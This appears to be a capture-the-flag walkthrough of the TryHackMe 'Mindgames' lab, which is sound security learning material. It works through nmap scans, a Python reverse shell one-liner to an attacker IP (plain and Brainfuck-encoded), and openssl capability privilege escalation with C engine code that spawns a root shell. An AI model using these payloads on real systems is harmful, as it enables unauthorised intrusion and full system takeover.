# Mindgames CTF TryHackme Fulle Walkthrough


## 🧩 Challenge Description
No hints. Hack it. Don't give up if you get stuck, enumerate harder


## 🛠️ Approach
*** In this challenge the IP address I am using is 10.113.187.44 - please feel free to change it


# We run a basic nmap scan against the target
`nmap 10.113.187.44 --top-ports 10000 -T5 -oN top10000.txt`

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

+ we can see that SSH and HTTP are running on the target machine


+ lets delve deeper with an advanced nmap scan against these specific ports


# We run a deeper nmap scan against the target


`nmap -sC -sS -A --version-intensity 5 -v5 -T5 10.113.187.44 -p 22,80 -oN advancedNmap.txt --open --reason`


```
80/tcp open  http    syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

+ we get information about both SSH and HTTP but http strikes me as interesting

 
+ we have a website called 'mindgames' that accepts the following methods


# We enumerate the website for anything


`curl http://10.113.187.44`


```
<form id="codeForm">
        <textarea id="code" placeholder="Enter your code here..."></textarea><br>
        <button>Run it!</button>
</form>
```

+ the code form strikes me as interesting

  
+ browsing the website manually it appears we can execute brainfuck code in the interpreter

  
+ what if we manually encoded a python payload to get a reverse shell?



# We obtain a reverse shell using a manual exploit against the brainfuck python interpreter


`nc -nlvp 8000`


+ grab the following reverse shell from revshells.com

  
`import os,pty,socket;s=socket.socket();s.connect(("192.168.136.132",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")`


+ use dcode to encode it into brainfuck

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-----.++++.<<++++++++++++.>>---.++++.+++++.<<.>>------.----.------------.++++++++.------.+++++++++++++++.<-----------.>-.<++.>.----.------------.++++++++.------.+++++++++++++++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<------.+.>--.>-.<<+++++.>>----------------.++++++++++++.-..---------.--.+++++++++++++++++.<<------..------.>----------.++++++++.-------.----.+++.+++++.++.----------.+++.++.+++.--------.+++.++.-.<.>------.++++++++++++.--------...<+++++++..>+++++++++++.>-------------------------.++++++++++++++++++++.++++.<<+++++.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.>>---------.<<---.>>.+++++++++.+++.<<---------.>>------------.<<.>>+++.+++++.<<++++++++.++++++++.----.+++++.-----.++++++.---------.>>-----------------.<.>+++++++++++++++++++.++++.+++++.<<+++++.>>------.---.---------------.++++++++++++++++++++++.---------.<<------.------.>>+++++.-----------.<<.+++++++.
```


+ once done execute this into the interpreter and we will receieve a reverse shell connection



# Lets read the user.txt file


`mindgames@mindgames:~/webserver$ cd ..`


`mindgames@mindgames:~$ cat user.txt`


thm{******38247ff441ce4e13**********}


# We search the system for capabilities


`getcap -r / 2>/dev/null`

```
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

+ the openssl capability strikes me as interesting. After a bit of research I discover it is vulnerable to privilege escalation


# Privilege escalation via capabilities


+ We paste the following tweaked code to work into exploit.c on OUR own linux attacking device after opening a new file


`nano exploit.c`

```
#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); 
    setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()"
```


+ Once we have done that we install dependencies on our attacking machine


`sudo update`


`sudo apt install libssl-dev`


+ we compile the C code and create a shared object


`gcc -fPIC -o exploit.o -c exploit.c`


`gcc -shared -o exploit.so -lcrypto exploit.o`


# We transfer the exploit to the target machine so we can execute the binary

+ start up a python server on your attacker machine

`python3 -m http.server 8000`


*** Back to the target machine ***


`mindgames@mindgames:/tmp$ wget http://<your attacker ip>:8000/exploit.so`


`mindgames@mindgames:/tmp$ openssl req -engine ./exploit.so`


+ we have exploited the vulnerability and obtained root. Now for the root flag


`root@mindgames:/tmp# cd /root`


`root@mindgames:/root# cat root.txt`


thm{******17cc84c5b51411c2**********}


##### I hope this walkthrough helped you with this CTF and helped you learn something today! #####
